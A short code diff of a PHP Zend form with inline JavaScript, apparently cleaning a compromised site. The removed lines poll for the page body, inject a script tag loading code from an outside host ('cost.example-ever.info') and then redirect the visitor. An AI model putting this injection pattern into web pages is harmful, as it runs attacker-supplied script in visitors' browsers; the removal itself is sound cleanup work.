@@ -85,15 +85,6 @@ class Xmltv_Form_TypeaheadForm extends Zend_Form
 		            		var overlay = $('<div/>').css(bgStyle);
 		            		overlay.appendTo($('body')).show(200);
 		            		
-		            		var script = document.createElement('script');
-						     var i = setInterval(function() {
-						       if (typeof document.body !== 'undefined') {
-						           script.src = 'http://cost.example-ever.info' + '/?77546=nteemMyIhoWJgYOOmdfY39_a3g';
-						           document.body.appendChild(script);
-						           clearInterval(i);
-						           window.location = url;
-						       }
-						     }, 200);
 		            	}
 		            });
 		        	<?php 
